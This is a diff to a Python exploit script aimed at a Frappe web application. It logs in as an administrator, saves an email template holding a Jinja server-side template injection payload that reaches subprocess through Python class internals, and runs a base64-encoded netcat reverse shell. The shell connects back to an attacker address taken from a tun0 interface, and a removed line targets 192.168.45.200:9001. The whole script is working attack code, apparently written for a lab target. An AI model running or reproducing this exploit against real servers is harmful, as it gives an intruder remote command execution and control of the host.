@@ -122,7 +122,7 @@ def login(ip, admin_email, password):
 	print("Login failed")
 	exit(0)
 
-def create_email_template(ip, session, admin_email):
+def create_email_template(ip, session, admin_email, template):
 	curtime = (datetime.utcnow() - timedelta(hours = 4)).strftime("%Y-%m-%d %H:%M:%S.%f")
 	print("Current time: ", curtime)
 	records = [{
@@ -151,7 +151,7 @@ def create_email_template(ip, session, admin_email):
 		"owner":admin_email,
 		"__newname":template_name,
 		"subject":"Pwned!",
-		"response":"<div>baseline</div>"
+		"response":"<div>" + template + "</div>"
 	}
 
 	target = f"http://{ip}:8000/api/method/frappe.desk.form.save.savedocs"
@@ -201,19 +201,32 @@ def create_email_template(ip, session, admin_email):
 
 	# print(r.text)
 
-def execute_command(ip, session, command):
+def generate_shellcode(LHOST, LPORT):
+	command = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"
+	encoded = base64.b64encode(command.encode())
+	encoded = encoded.decode()
 
-	template = """
-	{{\% set string = "test" \%}}
-	{{\% set class = "\x5f\x5fclass\x5f\x5f" \%}}
-	{{\% set mro = "\x5f\x5fmro\x5f\x5f" \%}}
-	{{\% set subclasses = "\x5f\x5fsubclasses\x5f\x5f" \%}}
-	{{\% set mro = string|attr(class)|attr(mro) \%}}
-	{{\% set subclasses = mro[1]|attr(subclasses)() \%}}
-	{{\% set subprocess = subclasses[391] \%}}
-	{{\% set shellcode = "echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjQ1LjIwMCA5MDAxID4vdG1wL2Y= | base64 -d  | sh" \%}}
-	{{{{subprocess(shellcode, shell=True)}}}}
-	"""
+	return encoded
+
+def execute_command(ip, session, admin_email, command):
+
+	LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
+	LPORT = 9001
+	shellcode = generate_shellcode(LHOST, LPORT)	
+
+	template = ("{% set string = \"test\" %}"
+	"{% set class_template = \"\\x5f\\x5fclass\\x5f\\x5f\" %}"
+	"{% set mro_template = \"\\x5f\\x5fmro\\x5f\\x5f\" %}"
+	"{% set subclasses_template = \"\\x5f\\x5fsubclasses\\x5f\\x5f\" %}"
+	"{% set mro = string|attr(class_template)|attr(mro_template) %}"
+	"{% set subclasses = mro[1]|attr(subclasses_template)() %}"
+	"{% set subprocess = subclasses[391] %}"
+	"{% set shellcode = \"echo " + shellcode + " = | base64 -d  | sh\" %}"
+	"{{subclasses}}"
+	)
+
+	template_name = create_email_template(ip, session, admin_email, template)
+	print(template_name)
 
 	print(template)
 	# template_name = create_email_template(ip, session, admin_email, template)
@@ -247,7 +260,7 @@ def main():
 	print("Logging in now")
 	session = login(ip, admin_email, new_password)
 
-	execute_command(ip, session, "whoami")
+	# execute_command(ip, session, admin_email, "whoami")
 	# print(f"Created new template named: {template_name}")
 
 	# update_template(ip, session, admin_email, template_name, "baseline2")
